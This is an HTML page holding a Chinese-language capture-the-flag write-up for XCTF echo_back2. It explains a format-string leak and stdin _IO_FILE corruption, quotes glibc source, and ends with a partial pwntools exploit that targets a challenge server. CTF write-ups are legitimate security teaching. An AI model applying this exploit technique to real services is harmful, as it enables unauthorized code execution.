@@ -1,0 +1,213 @@
+<!doctype html><html><head lang=en><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>XCTF-echo_back2-WP - blog of chuj</title><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="写在前面 由于我本地的环境和服务器完全不一样，所以这道题其实我完全没法做，看着wp云pwn了一下也算是学了一下scanf的部分实现了。 可见在本"><meta property="og:image" content><meta property="og:title" content="XCTF-echo_back2-WP"><meta property="og:description" content="写在前面 由于我本地的环境和服务器完全不一样，所以这道题其实我完全没法做，看着wp云pwn了一下也算是学了一下scanf的部分实现了。 可见在本"><meta property="og:type" content="article"><meta property="og:url" content="https://chujdk.github.io/wp/952.html"><meta property="article:section" content="posts"><meta property="article:published_time" content="2021-01-04T13:32:00+00:00"><meta property="article:modified_time" content="2021-01-04T13:32:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="XCTF-echo_back2-WP"><meta name=twitter:description content="写在前面 由于我本地的环境和服务器完全不一样，所以这道题其实我完全没法做，看着wp云pwn了一下也算是学了一下scanf的部分实现了。 可见在本"><script src=https://chujdk.github.io/js/feather.min.js></script>
+<link href=https://chujdk.github.io/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=https://chujdk.github.io/css/main.ac08a4c9714baa859217f92f051deb58df2938ec352b506df655005dcaf98cc0.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js></script>
+<script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js onload=renderMathInElement(document.body)></script>
+<script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})})</script><link rel=stylesheet type=text/css href=https://chujdk.github.io/css/font.e98a2c89163f90d6fa6d8baf5a50a6561f8ff3d0be1551265f364d138d75df33.css></head><body><div class=content><header><div class=main><a href=https://chujdk.github.io/>blog of chuj</a></div><nav><a href=/>Home</a>
+<a href=/posts.html>All posts</a>
+<a href=/about.html>About</a>
+<a href=/tags.html>Tags</a></nav></header><main><article><div class=title><h1 class=title>XCTF-echo_back2-WP</h1><div class=meta>Posted on Jan 4, 2021</div></div><section class=body><h4 id=写在前面>写在前面</h4><p>由于我本地的环境和服务器完全不一样，所以这道题其实我完全没法做，看着wp云pwn了一下也算是学了一下scanf的部分实现了。</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/01/1913441300.png></div><p>可见在本机，覆盖stdin的_IO_buf_base最低字节为0的话，是达不到修改_IO_buf_base的效果的。其实我已经用patchelf替换了libc，但是还是无法还原靶机。打算是之后搭建一套docker环境尽量还原靶机来对这类题进行动调。</p><h3 id=总结>总结</h3><p>我觉得这里还是有必要先总结一下的，由于我比较蠢，所以其实我在看完3篇其他博主的wp后还是迷迷糊糊的无法理解。考虑到我的文笔和水平也都很差，光看后面的分析您可能也没办法理解，事实上这个利用是很简单的，我这里列一下过程</p><ol><li>通过格式化字符串的漏洞leak出必要信息（我相信这个一步是大家都能自己想到的）</li><li>由于格式化字符串长度的限制，考虑利用scanf的漏洞实现任意地址写，写入我们的payload</li></ol><p>就是这简单的两步。而之后会有的一长段对scanf实现的分析都是解释如何利用scanf的漏洞，简单的说就是通过修改_IO_buf_base（一个指向scanf写入地址的指针）为我们想写入的地址 也就是main函数的返回地址。</p><h3 id=漏洞分析>漏洞分析</h3><p>本机打不通就只能看WP了，再总结一下本题核心的利用方法，就是通过修改<code>_IO_2_1_stdin_</code>这个文件变量（_IO_FILE）实现<code>scanf</code>的任意地址写。</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/01/3060002191.png></div><p>这是一个明显的格式化字符串漏洞点，通过他我们可以轻易地leak栈上的信息，这里打开gdb动调一下。将断点下在这个printf处，查看一下栈的情况</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/01/3116468849.png></div><p>可以看到，我们可以通过 <code>%n$p</code>轻易的leak出canary，main函数的栈基地址，该进程的基址，libc基址（这是一个坑点，我的机器上与start_main的偏移是384，而服务器上却是240）。（格式化占位符中的 <code>n</code>的计算方法可以参见我的这篇<a href=https://www.cjovi.icu/WP/buu-xman_2019_format-wp.html>文章</a>中“参数的计算”这节）</p><p>现在的问题虽然有这么一个格式化字符串漏洞，但是格式化字符串的长度最长只能到7，显然是不够我们修改return address的（毕竟p64一下就要8个字节了）。不过我们注意到，</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/01/2696759564.png></div><p>还有这样一个函数可用，虽然只能输入一次，而且一次也只能写7个字节，但是考虑到64位程序的最高两位基本都是0，所以7个字节也够我们布置一个地址了，再通过之前的格式化字符串漏洞就可以把任意地址的一个或两个或四个字节置零。看起来好像也没什么用是吧，但是其实很有用，利用这个方法可以攻击stdin，通过<code>scanf</code>实现任意地址写。</p><p>stdin在libc中的变量名是<code>_IO_2_1_stdin_</code>，类型是_IO_FILE型结构体指针，这个结构体是这么定义的</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>_IO_FILE</span> {
+</span></span><span style=display:flex><span>  <span style=color:#902000>int</span> _flags;		<span style=color:#60a0b0;font-style:italic>/* High-order word is _IO_MAGIC; rest is flags. */</span>
+</span></span><span style=display:flex><span><span style=color:#007020>#define _IO_file_flags _flags
+</span></span></span><span style=display:flex><span><span style=color:#007020></span>
+</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>/* The following pointers correspond to the C++ streambuf protocol. */</span>
+</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span>
+</span></span><span style=display:flex><span>  <span style=color:#902000>char</span><span style=color:#666>*</span> _IO_read_ptr;	<span style=color:#60a0b0;font-style:italic>/* Current read pointer */</span>
+</span></span><span style=display:flex><span>  <span style=color:#902000>char</span><span style=color:#666>*</span> _IO_read_end;	<span style=color:#60a0b0;font-style:italic>/* End of get area. */</span>
+</span></span><span style=display:flex><span>  <span style=color:#902000>char</span><span style=color:#666>*</span> _IO_read_base;	<span style=color:#60a0b0;font-style:italic>/* Start of putback+get area. */</span>
+</span></span><span style=display:flex><span>  <span style=color:#902000>char</span><span style=color:#666>*</span> _IO_write_base;	<span style=color:#60a0b0;font-style:italic>/* Start of put area. */</span>
+</span></span><span style=display:flex><span>  <span style=color:#902000>char</span><span style=color:#666>*</span> _IO_write_ptr;	<span style=color:#60a0b0;font-style:italic>/* Current put pointer. */</span>
+</span></span><span style=display:flex><span>  <span style=color:#902000>char</span><span style=color:#666>*</span> _IO_write_end;	<span style=color:#60a0b0;font-style:italic>/* End of put area. */</span>
+</span></span><span style=display:flex><span>  <span style=color:#902000>char</span><span style=color:#666>*</span> _IO_buf_base;	<span style=color:#60a0b0;font-style:italic>/* Start of reserve area. */</span>
+</span></span><span style=display:flex><span>  <span style=color:#902000>char</span><span style=color:#666>*</span> _IO_buf_end;	<span style=color:#60a0b0;font-style:italic>/* End of reserve area. */</span>
+</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>/* The following fields are used to support backing up and undo. */</span>
+</span></span><span style=display:flex><span>  <span style=color:#902000>char</span> <span style=color:#666>*</span>_IO_save_base; <span style=color:#60a0b0;font-style:italic>/* Pointer to start of non-current get area. */</span>
+</span></span><span style=display:flex><span>  <span style=color:#902000>char</span> <span style=color:#666>*</span>_IO_backup_base;  <span style=color:#60a0b0;font-style:italic>/* Pointer to first valid character of backup area */</span>
+</span></span><span style=display:flex><span>  <span style=color:#902000>char</span> <span style=color:#666>*</span>_IO_save_end; <span style=color:#60a0b0;font-style:italic>/* Pointer to end of non-current get area. */</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>_IO_marker</span> <span style=color:#666>*</span>_markers;
+</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>_IO_FILE</span> <span style=color:#666>*</span>_chain;
+</span></span><span style=display:flex><span>  <span style=color:#902000>int</span> _fileno;
+</span></span><span style=display:flex><span><span style=color:#007020>#if 0</span><span style=color:#60a0b0;font-style:italic>
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>  int _blksize;
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#007020>#else
+</span></span></span><span style=display:flex><span><span style=color:#007020></span>  <span style=color:#902000>int</span> _flags2;
+</span></span><span style=display:flex><span><span style=color:#007020>#endif
+</span></span></span><span style=display:flex><span><span style=color:#007020></span>  _IO_off_t _old_offset; <span style=color:#60a0b0;font-style:italic>/* This used to be _offset but it&#39;s too small.  */</span>
+</span></span><span style=display:flex><span><span style=color:#007020>#define __HAVE_COLUMN </span><span style=color:#60a0b0;font-style:italic>/* temporary */</span><span style=color:#007020>
+</span></span></span><span style=display:flex><span><span style=color:#007020></span>  <span style=color:#60a0b0;font-style:italic>/* 1+column number of pbase(); 0 is unknown. */</span>
+</span></span><span style=display:flex><span>  <span style=color:#902000>unsigned</span> <span style=color:#902000>short</span> _cur_column;
+</span></span><span style=display:flex><span>  <span style=color:#902000>signed</span> <span style=color:#902000>char</span> _vtable_offset;
+</span></span><span style=display:flex><span>  <span style=color:#902000>char</span> _shortbuf[<span style=color:#40a070>1</span>];
+</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>/*  char* _save_gptr;  char* _save_egptr; */</span>
+</span></span><span style=display:flex><span>  _IO_lock_t <span style=color:#666>*</span>_lock;
+</span></span><span style=display:flex><span><span style=color:#007020>#ifdef _IO_USE_OLD_IO_FILE
+</span></span></span><span style=display:flex><span><span style=color:#007020></span>};
+</span></span></code></pre></div><h4 id=scanf的实现>scanf的实现</h4><p>先不用仔细看这个结构体，我们是对scanf进行利用，先看一下其实现（glibc-2.23），他被定义在<code>/stdio-common/scanf.c</code>里</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>/* Read formatted input from stdin according to the format string FORMAT.  */</span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>/* VARARGS1 */</span>
+</span></span><span style=display:flex><span><span style=color:#902000>int</span>
+</span></span><span style=display:flex><span><span style=color:#06287e>__scanf</span> (<span style=color:#007020;font-weight:700>const</span> <span style=color:#902000>char</span> <span style=color:#666>*</span>format, ...)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>  va_list arg;
+</span></span><span style=display:flex><span>  <span style=color:#902000>int</span> done;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  va_start (arg, format);
+</span></span><span style=display:flex><span>  done <span style=color:#666>=</span> _IO_vfscanf (stdin, format, arg, <span style=color:#007020>NULL</span>);
+</span></span><span style=display:flex><span>  va_end (arg);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>return</span> done;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>可以看到他实际调用的是<code>_IO_vfscanf</code>，该函数被实现为<code>_io_vfscanf_internal</code>，跟进，发现有一千多行，非常可怕，但是我们只考虑他对下一字符不是<code>'%'</code>的处理</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/01/3383859101.png></div><p>可以看到他是调用inchar函数来读入的，我们继续跟进，实际上这是个宏</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#007020># define inchar()	(c == WEOF ? ((errno = inchar_errno), WEOF)	      \
+</span></span></span><span style=display:flex><span><span style=color:#007020>			 : ((c = _IO_getwc_unlocked (s)),		      \
+</span></span></span><span style=display:flex><span><span style=color:#007020>			    (void) (c != WEOF				      \
+</span></span></span><span style=display:flex><span><span style=color:#007020>				    ? ++read_in				      \
+</span></span></span><span style=display:flex><span><span style=color:#007020>				    : (size_t) (inchar_errno = errno)), c))
+</span></span></span></code></pre></div><p>调用的是<code>_IO_getwc_unlocked</code>，还是个宏</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#007020># define _IO_getwc_unlocked(_fp) \
+</span></span></span><span style=display:flex><span><span style=color:#007020>  (_IO_BE ((_fp)-&gt;_wide_data == NULL					\
+</span></span></span><span style=display:flex><span><span style=color:#007020>	   || ((_fp)-&gt;_wide_data-&gt;_IO_read_ptr				\
+</span></span></span><span style=display:flex><span><span style=color:#007020>	       &gt;= (_fp)-&gt;_wide_data-&gt;_IO_read_end), 0)			\
+</span></span></span><span style=display:flex><span><span style=color:#007020>   ? __wuflow (_fp) : (_IO_wint_t) *(_fp)-&gt;_wide_data-&gt;_IO_read_ptr++)
+</span></span></span></code></pre></div><p>当<code>_IO_read_ptr &lt; _IO_read_end</code>时，直接就是<code>_IO_read_ptr</code>，对我们的利用没什么帮助，而<code>_IO_read_ptr >= _IO_read_end</code>时，调用了<code>__wuflow (_fp)</code>这个东西，据说这个的实现逻辑是<code>_IO_new_file_underflow</code></p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#902000>int</span>
+</span></span><span style=display:flex><span><span style=color:#06287e>_IO_new_file_underflow</span> (_IO_FILE <span style=color:#666>*</span>fp)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>  _IO_ssize_t count;
+</span></span><span style=display:flex><span><span style=color:#007020>#if 0</span><span style=color:#60a0b0;font-style:italic>
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>  /* SysV does not make this test; take it out for compatibility */
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>  if (fp-&gt;_flags &amp; _IO_EOF_SEEN)
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>    return (EOF);
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#007020>#endif
+</span></span></span><span style=display:flex><span><span style=color:#007020></span>
+</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>if</span> (fp<span style=color:#666>-&gt;</span>_flags <span style=color:#666>&amp;</span> _IO_NO_READS)
+</span></span><span style=display:flex><span>    {
+</span></span><span style=display:flex><span>      fp<span style=color:#666>-&gt;</span>_flags <span style=color:#666>|=</span> _IO_ERR_SEEN;
+</span></span><span style=display:flex><span>      __set_errno (EBADF);
+</span></span><span style=display:flex><span>      <span style=color:#007020;font-weight:700>return</span> EOF;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>if</span> (fp<span style=color:#666>-&gt;</span>_IO_read_ptr <span style=color:#666>&lt;</span> fp<span style=color:#666>-&gt;</span>_IO_read_end)
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>return</span> <span style=color:#666>*</span>(<span style=color:#902000>unsigned</span> <span style=color:#902000>char</span> <span style=color:#666>*</span>) fp<span style=color:#666>-&gt;</span>_IO_read_ptr;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>if</span> (fp<span style=color:#666>-&gt;</span>_IO_buf_base <span style=color:#666>==</span> <span style=color:#007020>NULL</span>)
+</span></span><span style=display:flex><span>    {
+</span></span><span style=display:flex><span>      <span style=color:#60a0b0;font-style:italic>/* Maybe we already have a push back pointer.  */</span>
+</span></span><span style=display:flex><span>      <span style=color:#007020;font-weight:700>if</span> (fp<span style=color:#666>-&gt;</span>_IO_save_base <span style=color:#666>!=</span> <span style=color:#007020>NULL</span>)
+</span></span><span style=display:flex><span>	{
+</span></span><span style=display:flex><span>	  free (fp<span style=color:#666>-&gt;</span>_IO_save_base);
+</span></span><span style=display:flex><span>	  fp<span style=color:#666>-&gt;</span>_flags <span style=color:#666>&amp;=</span> <span style=color:#666>~</span>_IO_IN_BACKUP;
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>      _IO_doallocbuf (fp);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>/* Flush all line buffered files before reading. */</span>
+</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>/* FIXME This can/should be moved to genops ?? */</span>
+</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>if</span> (fp<span style=color:#666>-&gt;</span>_flags <span style=color:#666>&amp;</span> (_IO_LINE_BUF<span style=color:#666>|</span>_IO_UNBUFFERED))
+</span></span><span style=display:flex><span>    {
+</span></span><span style=display:flex><span><span style=color:#007020>#if 0</span><span style=color:#60a0b0;font-style:italic>
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>      _IO_flush_all_linebuffered ();
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#007020>#else
+</span></span></span><span style=display:flex><span><span style=color:#007020></span>      <span style=color:#60a0b0;font-style:italic>/* We used to flush all line-buffered stream.  This really isn&#39;t
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>	 required by any standard.  My recollection is that
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>	 traditional Unix systems did this for stdout.  stderr better
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>	 not be line buffered.  So we do just that here
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>	 explicitly.  --drepper */</span>
+</span></span><span style=display:flex><span>      _IO_acquire_lock (_IO_stdout);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>      <span style=color:#007020;font-weight:700>if</span> ((_IO_stdout<span style=color:#666>-&gt;</span>_flags <span style=color:#666>&amp;</span> (_IO_LINKED <span style=color:#666>|</span> _IO_NO_WRITES <span style=color:#666>|</span> _IO_LINE_BUF))
+</span></span><span style=display:flex><span>	  <span style=color:#666>==</span> (_IO_LINKED <span style=color:#666>|</span> _IO_LINE_BUF))
+</span></span><span style=display:flex><span>	_IO_OVERFLOW (_IO_stdout, EOF);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>      _IO_release_lock (_IO_stdout);
+</span></span><span style=display:flex><span><span style=color:#007020>#endif
+</span></span></span><span style=display:flex><span><span style=color:#007020></span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  _IO_switch_to_get_mode (fp);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>/* This is very tricky. We have to adjust those
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>     pointers before we call _IO_SYSREAD () since
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>     we may longjump () out while waiting for
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>     input. Those pointers may be screwed up. H.J. */</span>
+</span></span><span style=display:flex><span>  fp<span style=color:#666>-&gt;</span>_IO_read_base <span style=color:#666>=</span> fp<span style=color:#666>-&gt;</span>_IO_read_ptr <span style=color:#666>=</span> fp<span style=color:#666>-&gt;</span>_IO_buf_base;
+</span></span><span style=display:flex><span>  fp<span style=color:#666>-&gt;</span>_IO_read_end <span style=color:#666>=</span> fp<span style=color:#666>-&gt;</span>_IO_buf_base;
+</span></span><span style=display:flex><span>  fp<span style=color:#666>-&gt;</span>_IO_write_base <span style=color:#666>=</span> fp<span style=color:#666>-&gt;</span>_IO_write_ptr <span style=color:#666>=</span> fp<span style=color:#666>-&gt;</span>_IO_write_end
+</span></span><span style=display:flex><span>    <span style=color:#666>=</span> fp<span style=color:#666>-&gt;</span>_IO_buf_base;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  count <span style=color:#666>=</span> _IO_SYSREAD (fp, fp<span style=color:#666>-&gt;</span>_IO_buf_base,
+</span></span><span style=display:flex><span>		       fp<span style=color:#666>-&gt;</span>_IO_buf_end <span style=color:#666>-</span> fp<span style=color:#666>-&gt;</span>_IO_buf_base);
+</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>if</span> (count <span style=color:#666>&lt;=</span> <span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>    {
+</span></span><span style=display:flex><span>      <span style=color:#007020;font-weight:700>if</span> (count <span style=color:#666>==</span> <span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>	fp<span style=color:#666>-&gt;</span>_flags <span style=color:#666>|=</span> _IO_EOF_SEEN;
+</span></span><span style=display:flex><span>      <span style=color:#007020;font-weight:700>else</span>
+</span></span><span style=display:flex><span>	fp<span style=color:#666>-&gt;</span>_flags <span style=color:#666>|=</span> _IO_ERR_SEEN, count <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>  fp<span style=color:#666>-&gt;</span>_IO_read_end <span style=color:#666>+=</span> count;
+</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>if</span> (count <span style=color:#666>==</span> <span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>    {
+</span></span><span style=display:flex><span>      <span style=color:#60a0b0;font-style:italic>/* If a stream is read to EOF, the calling application may switch active
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>	 handles.  As a result, our offset cache would no longer be valid, so
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>	 unset it.  */</span>
+</span></span><span style=display:flex><span>      fp<span style=color:#666>-&gt;</span>_offset <span style=color:#666>=</span> _IO_pos_BAD;
+</span></span><span style=display:flex><span>      <span style=color:#007020;font-weight:700>return</span> EOF;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>if</span> (fp<span style=color:#666>-&gt;</span>_offset <span style=color:#666>!=</span> _IO_pos_BAD)
+</span></span><span style=display:flex><span>    _IO_pos_adjust (fp<span style=color:#666>-&gt;</span>_offset, count);
+</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>return</span> <span style=color:#666>*</span>(<span style=color:#902000>unsigned</span> <span style=color:#902000>char</span> <span style=color:#666>*</span>) fp<span style=color:#666>-&gt;</span>_IO_read_ptr;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>这么长我是没怎么看懂的，但是重要的是这一段</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>count <span style=color:#666>=</span> _IO_SYSREAD (fp, fp<span style=color:#666>-&gt;</span>_IO_buf_base,
+</span></span><span style=display:flex><span>		       fp<span style=color:#666>-&gt;</span>_IO_buf_end <span style=color:#666>-</span> fp<span style=color:#666>-&gt;</span>_IO_buf_base);
+</span></span></code></pre></div><p>会在</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#007020;font-weight:700>if</span> (fp<span style=color:#666>-&gt;</span>_IO_read_ptr <span style=color:#666>&lt;</span> fp<span style=color:#666>-&gt;</span>_IO_read_end)
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>return</span> <span style=color:#666>*</span>(<span style=color:#902000>unsigned</span> <span style=color:#902000>char</span> <span style=color:#666>*</span>) fp<span style=color:#666>-&gt;</span>_IO_read_ptr;
+</span></span></code></pre></div><p>这个<code>if</code>不通过，也就是<code>fp->_IO_read_ptr >= fp->_IO_read_end</code>时执行。也就是向<code>fp->_IO_buf_base</code>到<code>fp->_IO_buf_end</code>这一段地址中写入数据。</p><p>这样我们就可以<del>非常自然地</del>想到，如果我们可以修改<code>fp->_IO_buf_base</code>指向的位置到我们想修改的地址，就可以实现任意地址写了。然后我们看一下<code>_IO_2_1_stdin_</code>在内存中的样子，可以使用gdb的<code>print</code>指令（简写为<code>p</code>）</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/01/1913441300.png></div><p>这里我的虚拟机里面的内存分布，这样是无法利用的，但是服务器的分布下，如果通过之前的格式化字符串漏洞将<code>fp->_IO_buf_base</code>的最低位置零，那么它就指向了<code>fp->_IO_write_base</code>（不知道这是巧合还是必然），然后我们在<code>scanf</code>的时候就可以控制<code>_IO_buf_base</code>和<code>_IO_buf_end</code>指向的地址了。如果我们将<code>_IO_buf_base</code>指向main的return address（该地址在之前被leak出来了），就可以写入rop链，实现get shell</p><p>不过还需要注意的是，在scanf完成后，被读入的字符串的长度会被加到<code>_IO_read_end</code>上，所以为了实现之后的任意地址写我们还要想办法给<code>_IO_read_ptr</code>加上同样的值。幸运的是，<code>getchar</code>就可以做到</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/01/2072554772.png></div><p>上面这个宏就是<code>getchar</code>实际调用的宏，可见给<code>_IO_read_ptr</code>加了1。</p><p>而实现echo_back功能的这个函数里就调用了<code>getchar</code>，所以我们调用一定次数的该函数就可以写main的return address了。</p><p>总结一下我们是如何修改<code>_IO_buf_base</code>的：由于这个指针在<code>_IO_2_1_stdin_</code>这个libc中的全局变量里，他的地址是可以直接计算出来的，然而我们确实无法直接修改这个指针为我们想要的值，因为我们的格式化字符串的长度只允许我们对某个地址置零，所以我们先把他的最低字节置零，这样他就指向了<code>_IO_write_base</code>，我们就可以修改<code>_IO_write_base</code>到<code>_IO_buf_end</code>中的所有的值了，就实现了对<code>_IO_buf_base</code>的修改。</p><h3 id=exp>exp</h3><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#!/usr/bin/env python</span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># coding=utf-8</span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>from</span> <span style=color:#0e84b5;font-weight:700>pwn</span> <span style=color:#007020;font-weight:700>import</span> <span style=color:#666>*</span>
+</span></span><span style=display:flex><span>context(log_level <span style=color:#666>=</span> <span style=color:#4070a0>&#39;debug&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#sh = process(&#34;./echo_back&#34;)</span>
+</span></span><span style=display:flex><span>sh <span style=color:#666>=</span> remote(<span style=color:#4070a0>&#34;220.249.52.134&#34;</span>,<span style=color:#4070a0>&#34;41765&#34;</span>)
+</span></span><span style=display:flex><span>elf <span style=color:#666>=</span> ELF(<span style=color:#4070a0>&#34;./echo_back&#34;</span>)
+</span></span><span style=display:flex><span>libc <span style=color:#666>=</span> ELF(<span style=color:#4070a0>&#34;./libc.so.6&#34;</span>)
+</span></span><span style=display:flex><span>stdin_FILE <span style=color:#666>=</span> <span style=color:#40a070>0x3C48E0</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>echo_back</span>(payload):
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;choice&gt;&gt; &#34;</span>,<span style=color:#4070a0>&#39;2&#39;</span>)
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;length:&#34;</span>,<span style=color:#007020>str</span>(<span style=color:#007020>len</span>(payload)))
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>send(payload)
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;say:&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>echo_back(<span style=color:#4070a0>&#34;%13$p&#34;</span>)
+</span></span><span style=display:flex><span>elf_base <span style=color:#666>=</span> <span style=color:#007020>int</span>(sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#39;--&#39;</span>,drop <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>True</span>), base <span style=color:#666>=</span> <span style=color:#40a070>16</span>) <span style=color:#666>-</span> <span style=color:#40a070>0xd08</span> <span style=color:#60a0b0;font-style:italic>#leak elfbase</span>
+</span></span><span style=display:flex><span><span style=color:#007020>print</span>(<span style=color:#4070a0>&#34;canary: </span><span style=color:#70a0d0>%s</span><span style=color:#4070a0>&#34;</span> <span style=color:#666>%</span> <span style=color:#007020>str</span>(<span style=color:#007020>hex</span>(elf_base)))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>echo_back(<span style=color:#4070a0>&#34;%19$p&#34;</span>)
+</span></span><span style=display:flex><span>libc_start_main_addr <span style=color:#666>=</span> <span style=color:#007020>int</span>(sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#39;--&#39;</span>,drop <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>True</span>), base <span style=color:#666>=</span> <span style=color:#40a070>16</span>) <span style=color:#60a0b0;font-style:italic>#leak libc</span>
